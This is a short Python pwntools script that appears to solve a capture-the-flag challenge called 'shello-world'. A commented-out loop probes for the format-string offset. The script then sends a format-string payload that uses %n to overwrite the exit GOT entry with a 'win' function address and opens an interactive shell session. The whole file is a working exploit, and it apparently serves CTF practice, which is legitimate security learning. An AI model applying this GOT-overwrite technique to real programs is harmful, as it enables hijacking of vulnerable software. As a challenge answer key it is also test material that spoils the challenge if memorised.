from pwn import *

io = process('../../TFC/shello-world')
elf = ELF('../../TFC/shello-world')

#To find the address of input variable
# for i in range(1, 50):
#     io = process('../../TFC/shello-world')
#     payload = f'AAAAAAAA.%{i}$p'
#     io.sendline(payload)
#     resp = io.recvall()
#     print(resp, i)
#     if(b"0x4141" in resp):
#         print(i)
#         break

#found i = 6

# win = 0x401176 = 4198774
payload = b'%4198774x%8$nAAA' + p64(elf.got.exit)
io.sendline(payload)
io.interactive()
